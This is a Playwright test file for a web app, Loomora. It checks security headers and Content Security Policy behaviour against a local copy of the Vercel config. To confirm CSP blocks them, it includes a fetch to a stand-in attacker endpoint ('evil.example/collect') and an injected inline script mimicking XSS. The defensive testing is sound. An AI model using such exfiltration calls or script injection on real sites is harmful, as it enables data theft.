import { expect, test, type Page } from '@playwright/test'
import fs from 'node:fs'
import http from 'node:http'
import path from 'node:path'

interface VercelHeaderRule {
  source: string
  headers: { key: string; value: string }[]
}

interface VercelConfig {
  rewrites?: { source: string; destination: string }[]
  headers?: VercelHeaderRule[]
}

const MIME_TYPES: Record<string, string> = {
  '.css': 'text/css; charset=utf-8',
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.webmanifest': 'application/manifest+json; charset=utf-8',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
}

function readVercelConfig(repoRoot: string): VercelConfig {
  const configPath = path.join(repoRoot, 'vercel.json')
  return JSON.parse(fs.readFileSync(configPath, 'utf8')) as VercelConfig
}

function serveFile(
  res: http.ServerResponse,
  filePath: string,
  pathname: string,
  headerRules: VercelHeaderRule[],
  status = 200,
) {
  const ext = path.extname(filePath).toLowerCase()
  res.statusCode = status
  res.setHeader('Content-Type', MIME_TYPES[ext] ?? 'application/octet-stream')
  for (const rule of headerRules) {
    if (new RegExp(`^${rule.source}$`).test(pathname)) {
      for (const header of rule.headers) {
        res.setHeader(header.key, header.value)
      }
    }
  }
  fs.createReadStream(filePath).pipe(res)
}

async function startVercelHost(repoRoot: string) {
  const distDir = path.join(repoRoot, 'dist')
  const config = readVercelConfig(repoRoot)
  const rewrites = config.rewrites ?? []
  const headerRules = config.headers ?? []

  const server = http.createServer((req, res) => {
    const pathname = new URL(req.url ?? '/', 'http://127.0.0.1').pathname
    const relative = pathname === '/' ? 'index.html' : pathname.replace(/^\/+/, '')
    const candidate = path.resolve(distDir, relative)

    if (
      candidate.startsWith(distDir + path.sep) &&
      fs.existsSync(candidate) &&
      fs.statSync(candidate).isFile()
    ) {
      serveFile(res, candidate, pathname, headerRules, 200)
      return
    }

    for (const rule of rewrites) {
      if (new RegExp(`^${rule.source}$`).test(pathname)) {
        const dest = path.resolve(distDir, rule.destination.replace(/^\/+/, ''))
        if (fs.existsSync(dest) && fs.statSync(dest).isFile()) {
          serveFile(res, dest, pathname, headerRules, 200)
          return
        }
      }
    }

    res.statusCode = 404
    res.setHeader('Content-Type', 'text/plain; charset=utf-8')
    res.end('404 NOT_FOUND')
  })

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  if (!address || typeof address === 'string') throw new Error('Expected TCP port')
  return {
    baseUrl: `http://127.0.0.1:${address.port}`,
    close: () =>
      new Promise<void>((resolve, reject) =>
        server.close((err) => (err ? reject(err) : resolve())),
      ),
  }
}

async function trackSecurityProblems(page: Page) {
  const problems: string[] = []
  const violations: { effectiveDirective: string; blockedURI: string }[] = []

  await page.addInitScript(() => {
    const win = window as Window & {
      __cspViolations?: { effectiveDirective: string; blockedURI: string }[]
    }
    win.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (event) => {
      win.__cspViolations?.push({
        effectiveDirective: event.effectiveDirective,
        blockedURI: event.blockedURI,
      })
    })
  })

  page.on('pageerror', (err) => problems.push(`pageerror: ${err.message}`))
  page.on('console', (msg) => {
    if (msg.type() === 'error' || msg.type() === 'warning') {
      problems.push(`${msg.type()}: ${msg.text()}`)
    }
  })

  return {
    problems,
    readViolations: async () => {
      const list = await page.evaluate(
        () =>
          (
            window as Window & {
              __cspViolations?: { effectiveDirective: string; blockedURI: string }[]
            }
          ).__cspViolations ?? [],
      )
      violations.splice(0, violations.length, ...list)
      return violations
    },
  }
}

test.describe('QA-015 Frontend security headers and CSP hardening', () => {
  const repoRoot = path.resolve('.')
  let host: Awaited<ReturnType<typeof startVercelHost>>

  test.beforeAll(async () => {
    host = await startVercelHost(repoRoot)
  })

  test.afterAll(async () => {
    await host.close()
  })

  test('HTTP responses emit security headers while preserving SPA rewrites, assets, and API exclusions', async ({
    request,
  }, testInfo) => {
    test.skip(testInfo.project.name !== 'phone-375', 'Single-run HTTP header contract check')

    const assetsDir = path.join(repoRoot, 'dist', 'assets')
    const firstJs = fs.readdirSync(assetsDir).find((file) => file.endsWith('.js'))
    const firstCss = fs.readdirSync(assetsDir).find((file) => file.endsWith('.css'))
    expect(firstJs).toBeTruthy()
    expect(firstCss).toBeTruthy()

    const validPaths = [
      '/',
      '/today',
      '/week',
      '/profile',
      '/sign-in',
      '/auth/google/callback',
      '/this-route-does-not-exist',
      '/sw.js',
      '/manifest.webmanifest',
      '/icon.svg',
      `/assets/${firstJs}`,
      `/assets/${firstCss}`,
    ]

    for (const reqPath of validPaths) {
      const res = await request.get(`${host.baseUrl}${reqPath}`)
      expect(res.status(), `GET ${reqPath}`).toBe(200)
      const headers = res.headers()
      expect(headers['x-content-type-options'], reqPath).toBe('nosniff')
      expect(headers['x-frame-options'], reqPath).toBe('DENY')
      expect(headers['referrer-policy'], reqPath).toBe('strict-origin-when-cross-origin')
      expect(headers['strict-transport-security'], reqPath).toContain('max-age=63072000')
      expect(headers['permissions-policy'], reqPath).toContain('camera=()')
      expect(headers['content-security-policy'], reqPath).toContain("default-src 'self'")
      expect(headers['content-security-policy'], reqPath).toContain("frame-ancestors 'none'")
    }

    const rootHeaders = (await request.get(`${host.baseUrl}/`)).headers()
    expect(rootHeaders['cache-control']).toBeUndefined()

    const swHeaders = (await request.get(`${host.baseUrl}/sw.js`)).headers()
    expect(swHeaders['cache-control']).toBe('public, max-age=0, must-revalidate')

    for (const excludedPath of ['/api', '/api/v1/health', '/assets/missing-chunk.js']) {
      const res = await request.get(`${host.baseUrl}${excludedPath}`)
      expect(res.status(), excludedPath).toBe(404)
      expect(await res.text()).not.toContain('<!doctype html>')
    }
  })

  test('CSP allows 375 px navigation, fonts, images, lazy routes, and sheets while blocking unauthorized script/connect', async ({
    page,
  }, testInfo) => {
    test.skip(testInfo.project.name !== 'phone-375', 'Mobile-first 375 px verification')

    const { problems, readViolations } = await trackSecurityProblems(page)

    await page.goto(`${host.baseUrl}/`)
    await expect(page.getByRole('heading', { level: 1, name: 'Loomora' })).toBeVisible()
    const logoOk = await page.evaluate(
      () =>
        new Promise<boolean>((resolve) => {
          const img = new Image()
          img.onload = () => resolve(img.complete && img.naturalWidth > 0)
          img.onerror = () => resolve(false)
          img.src = '/icon.svg'
        }),
    )
    expect(logoOk).toBe(true)

    const fontsLoaded = await page.evaluate(async () => {
      await document.fonts.ready
      let loaded = false
      document.fonts.forEach((font) => {
        if (font.status === 'loaded') loaded = true
      })
      return loaded
    })
    expect(fontsLoaded).toBe(true)

    await page.goto(`${host.baseUrl}/today`)
    await expect(page.getByRole('heading', { level: 1, name: 'Today' })).toBeVisible()

    // Exercise Sheet + Framer Motion DoneStamp + ProgressRing under CSP.
    await page.getByRole('button', { name: 'Add a to-do' }).click()
    const sheet = page.getByRole('dialog', { name: 'Add a to-do' })
    await sheet.getByLabel('Title').fill('Verify CSP task')
    await sheet.getByRole('button', { name: 'Add', exact: true }).click()
    await expect(sheet).toBeHidden()
    await page.getByText('Verify CSP task').click()
    await expect(page.getByRole('checkbox', { name: 'Mark “Verify CSP task” done' })).toBeChecked()

    // Exercise mobile bottom navigation across lazy routes.
    const bottomNav = page.getByTestId('bottom-nav')
    for (const label of ['Week', 'Focus', 'Insights', 'Today']) {
      await bottomNav.getByRole('link', { name: label }).click()
      await expect(page.getByRole('heading', { level: 1, name: label })).toBeVisible()
    }

    for (const routePath of [
      '/profile',
      '/sign-in',
      '/sign-up',
      '/privacy',
      '/terms',
      '/styleguide',
    ]) {
      await page.goto(`${host.baseUrl}${routePath}`)
      await expect(page.getByRole('heading', { level: 1 })).toBeVisible()
      const overflow = await page.evaluate(
        () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
      )
      expect(overflow, routePath).toBeLessThanOrEqual(0)
    }

    expect(await readViolations()).toEqual([])
    expect(problems).toEqual([])

    // Verify CSP actively blocks unauthorized connect-src and inline script-src.
    const blockedConnect = await page.evaluate(async () => {
      try {
        await fetch('https://evil.example/collect')
        return false
      } catch {
        return true
      }
    })
    expect(blockedConnect).toBe(true)

    await page.evaluate(() => {
      const script = document.createElement('script')
      script.textContent = 'window.__xssExecuted = true'
      document.body.appendChild(script)
    })
    expect(
      await page.evaluate(() => (window as Window & { __xssExecuted?: boolean }).__xssExecuted),
    ).toBeUndefined()

    const triggeredViolations = await readViolations()
    expect(triggeredViolations.some((v) => v.effectiveDirective === 'connect-src')).toBe(true)
    expect(
      triggeredViolations.some(
        (v) => v.effectiveDirective === 'script-src' || v.effectiveDirective === 'script-src-elem',
      ),
    ).toBe(true)
  })

  test('Render API requests, Google OAuth flow, and offline PWA continue working under CSP', async ({
    page,
    context,
    browserName,
  }, testInfo) => {
    test.skip(
      testInfo.project.name !== 'phone-375' || browserName !== 'chromium',
      'Mobile Chromium API + PWA verification',
    )

    const { problems, readViolations } = await trackSecurityProblems(page)

    await page.route('https://loomora-api.onrender.com/api/v1/**', async (route) => {
      if (route.request().method() === 'OPTIONS') {
        await route.fulfill({
          status: 204,
          headers: {
            'access-control-allow-origin': '*',
            'access-control-allow-headers': '*',
            'access-control-allow-methods': '*',
          },
        })
        return
      }
      const url = route.request().url()
      if (url.includes('/auth/google/exchange')) {
        await route.fulfill({
          status: 200,
          headers: { 'access-control-allow-origin': '*' },
          json: {
            token: '1|csp-google-token',
            expires_at: '2099-01-01T00:00:00Z',
            user: {
              id: '9f1c2d3e-4b5a-4c6d-8e7f-0a1b2c3d4e5f',
              name: 'sokha',
              email: 'sokha@example.com',
              has_password: false,
              email_verified_at: '2026-10-24T03:00:00Z',
              timezone: 'Asia/Phnom_Penh',
              time_format: '24h',
              week_starts_on: 1,
              goal: null,
              heard_from: null,
              survey_done: true,
              current_streak: 0,
              longest_streak: 0,
              created_at: '2026-10-24T03:00:00Z',
            },
          },
        })
        return
      }
      const json = url.includes('/streak')
        ? { data: { current_streak: 0, longest_streak: 0, today_counted: false } }
        : url.endsWith('/intention')
          ? { data: { date: '2026-11-20', text: null } }
          : { data: [] }
      await route.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, json })
    })

    await page.goto(`${host.baseUrl}/sign-in`)
    const googleHref = await page
      .getByRole('link', { name: 'Sign in with Google' })
      .getAttribute('href')
    expect(googleHref).toMatch(
      /^https:\/\/loomora-api\.onrender\.com\/api\/v1\/auth\/google\/redirect\?intent=sign_in/,
    )

    await page.goto(`${host.baseUrl}/auth/google/callback?code=qa015-valid-code`)
    await expect(page.getByRole('heading', { level: 1, name: 'Today' })).toBeVisible()

    // Ensure Service Worker installs and controls the page under CSP, then test offline reload.
    await page.evaluate(() => navigator.serviceWorker.ready.then(() => undefined))
    if (await page.evaluate(() => navigator.serviceWorker.controller === null)) {
      await page.reload()
    }
    await expect
      .poll(() => page.evaluate(() => navigator.serviceWorker.controller !== null))
      .toBe(true)

    await context.setOffline(true)
    await page.reload()
    await expect(page.getByRole('heading', { level: 1, name: 'Today' })).toBeVisible()
    await expect(page.getByText(/You are offline/)).toBeVisible()
    await context.setOffline(false)

    expect(await readViolations()).toEqual([])
    expect(problems).toEqual([])
  })
})
